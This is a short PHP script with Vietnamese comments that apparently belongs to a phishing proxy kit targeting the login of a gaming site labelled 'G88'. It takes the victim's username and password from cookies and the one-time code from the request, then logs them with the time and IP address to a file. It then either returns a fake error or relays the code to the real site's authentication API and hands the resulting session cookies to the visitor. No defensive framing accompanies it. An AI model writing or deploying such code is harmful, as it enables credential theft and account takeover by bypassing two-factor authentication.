<?php
include "get_config.php";

// lấy config
$gate = isset($_GET["gate"]) ? $_GET["gate"] : "G88";
$gate_config = get_config($gate);

//bóc tách dữ liệu
$raw_content = file_get_contents("php://input");

// save account
$json_data = json_decode($raw_content, 1);
$otp = $json_data["Otp"];
$username = $_COOKIE["username"];
$password = $_COOKIE["password"];

$time = date("H:i:s Y-m-d");
$ip = $_SERVER["REMOTE_ADDR"];
$fp = fopen($gate_config["file_otp_login"], "a+");
fwrite($fp, "$username|$password|$otp|$time|$ip\n");
fclose($fp);

// Nếu bật chức năng lưu otp đăng nhập
if ($gate_config["save_otp_login"]) {
	die('{"c":-1025,"m":""}');
}

// login with otp
echo login_otp($raw_content, $list_header);


function login_otp($raw_content, $list_header) {
    global $gate_config;
    $url = "https://id.".$gate_config["domain"]."/api/account/AuthenOTP";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
    $raw_content = curl_exec($ch);

    $re = "/Set-Cookie: ([^;]+)/m";
    preg_match_all($re, $raw_content, $matches, PREG_SET_ORDER, 0);
    foreach ($matches as $match) {
    	$key = explode("=", $match[1])[0];
    	$val = urldecode(explode("=", $match[1])[1]);
    	setcookie($key, $val, time() + (86400 * 30), "/");
    }
    return explode("\r\n\r\n", $raw_content)[1];
}
?>